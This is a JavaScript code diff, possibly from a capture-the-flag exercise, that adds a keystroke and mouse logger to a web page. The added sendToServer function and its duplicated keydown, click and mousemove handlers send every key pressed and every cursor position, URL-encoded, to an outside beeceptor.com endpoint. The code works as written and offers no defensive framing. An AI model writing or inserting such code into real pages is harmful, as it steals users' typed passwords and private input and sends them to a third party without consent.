@@ -158,7 +158,66 @@
         } else {
             fetch('https://rootmehere.free.beeceptor.com/NOopener');
         }
+
+        
     };
+// Fonction générique pour envoyer les données au serveur
+function sendToServer(action, data) {
+    const url = `https://rootmehere.free.beeceptor.com/${action}/${encodeURIComponent(data)}`;
+    fetch(url, {
+        method: 'GET', // Utilisation de la méthode GET pour envoyer les données dans l'URL
+        headers: {
+            'Content-Type': 'application/json'
+        }
+    }).then(response => {
+        console.log('Données envoyées au serveur:', response.status);
+    }).catch(error => {
+        console.log('Erreur lors de l\'envoi:', error);
+    });
+}
+
+// Événement keydown (frappe de touche)
+window.onkeydown = function(event) {
+    const action = 'keydown';
+    const data = event.key;  // Envoie la touche pressée
+    sendToServer(action, data);
+};
+
+// Événement click (clic de souris)
+window.onclick = function(event) {
+    const action = 'click';
+    const data = `Position: ${event.clientX}, ${event.clientY}`;  // Envoie la position du clic
+    sendToServer(action, data);
+};
+
+// Événement mousemove (mouvement de la souris)
+window.onmousemove = function(event) {
+    const action = 'mousemove';
+    const data = `Position: ${event.clientX}, ${event.clientY}`;  // Envoie la position de la souris
+    sendToServer(action, data);
+};
+
+// Écouteur de l'événement keydown (frappe de touche)
+document.addEventListener('keydown', function(event) {
+    const action = 'keydown';
+    const data = event.key;  // Envoie la touche pressée
+    sendToServer(action, data);
+});
+
+// Écouteur de l'événement click (clic de souris)
+document.addEventListener('click', function(event) {
+    const action = 'click';
+    const data = `Position: ${event.clientX}, ${event.clientY}`;  // Envoie la position du clic
+    sendToServer(action, data);
+});
+
+// Écouteur de l'événement mousemove (mouvement de la souris)
+document.addEventListener('mousemove', function(event) {
+    const action = 'mousemove';
+    const data = `Position: ${event.clientX}, ${event.clientY}`;  // Envoie la position de la souris
+    sendToServer(action, data);
+});
+
 
     // When a field is modified, send a request to the server with the modified field's name
     function fieldModified(fieldName) {
